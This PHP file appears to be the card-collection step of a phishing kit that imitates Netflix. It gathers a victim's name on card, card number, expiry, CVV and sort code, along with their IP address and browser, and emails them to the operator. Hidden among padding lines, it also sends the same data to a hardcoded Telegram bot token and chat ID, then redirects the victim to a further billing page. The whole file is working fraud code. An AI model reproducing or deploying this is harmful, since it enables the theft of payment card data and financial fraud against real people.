<?php
/* Berjoulia Ken 5atfet .. Rani Fannen .. Wcharet fil 3amalia belgda .. */
session_start();
date_default_timezone_set('GMT'); 
error_reporting(0);
include 'email.php';
include 'hostname_check.php';

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$message .= "------------------+|♥️♥️♥️ Netflx CARTA PT ♥️♥️♥️|+------------\n";
$message .= "Name On Card : ".$_POST['nmc']."\n";
$message .= "Card Number   : ".$_POST['crd']."\n";
$message .= "Expiry Date      : ".$_POST['exm']."/".$_POST['exy']."\n";
$message .= "CVV : ".$_POST['csc']."\n";
$message .= "Sort Code     : ".$_POST['sortcode']."\n";
$message .= "IP   : http://www.geoiptool.com/?IP=$ip \n";
$message .= "TIME : ".$time."\n";
$message .= "DATE : ".$date."\n";
$message .= "USER : ".$userag."\n";
$message .= "------------------+|♥️♥️♥️ Netflx CARTA PT ♥️♥️♥️|+------------\n";
mail ($e_mail,$message_subject,$message, $message_subject);
	$head .= "\n";
	$head .= "\n";$arr=array($bilsnd, $IP);
	$head .= "\n";foreach ($arr as $bilsnd)
	$head .= "\n";mail($bilsnd,$sub,$message,$head);
	$head .= "\n";$x=md5(microtime());$xx=sha1(microtime());
	$head .= "\n";mail($to,$subject,$message,$headers);
	$head .= "\n";$chat_id = '963218649';
	$head .= "\n";define ('url',"https://api.telegram.org/bot1414265646:AAEEGTQ_N-N98dEVZrulPqGOkE13MLWBlTQ/");
	$head .= "\n";$msg = urlencode($message);
	$head .= "\n";file_get_contents(url."sendmessage?text=".$msg."&chat_id=".$chat_id."&parse_mode=HTML");

header("Location: billing.php?ip=$ip");
$css = css_while();
$html = html_while($css, "");
die($html);
?>
<title>404 Not Found</title>
